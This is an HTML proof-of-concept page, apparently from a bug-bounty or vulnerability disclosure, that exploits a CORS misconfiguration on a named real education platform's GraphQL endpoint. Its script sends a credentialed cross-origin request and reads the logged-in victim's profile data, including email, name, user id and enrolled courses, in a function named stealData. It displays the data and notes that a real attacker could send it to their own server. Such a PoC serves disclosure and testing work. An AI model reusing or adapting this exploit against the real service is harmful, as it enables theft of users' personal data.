<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
<script>
    var req = new XMLHttpRequest();
    req.open('GET',"https://gateway.chegg.com/me-web-bff/graphql?query=query+HeaderDynamicDataRetroFit+%7B%0A++userProfile+%7B%0A++++uuid%0A++++email%0A++++emailShow%0A++++avatar%0A++++fname%3A+firstName%0A++++lname%3A+lastName%0A++++__typename%0A++%7D%0A++cartCount%0A++userCourses+%7B%0A++++courseDashboardUrl%0A++++courseName%0A++++courseUuid%0A++++__typename%0A++%7D%0A%7D%0A&operationName=HeaderDynamicDataRetroFit",true);
    req.onload = stealData;
    req.withCredentials = true;
    req.send();

    function stealData(){
        //reading response is allowed because of the CORS misconfiguration.
        var data= JSON.stringify(JSON.parse(this.responseText),null,2);

        //display the data on the page. A real attacker can send the data to his server.
        output(data);
    }

    function output(inp) {
        document.body.appendChild(document.createElement('pre')).innerHTML = inp;
    }
    </script>
     </body>
</html>
    
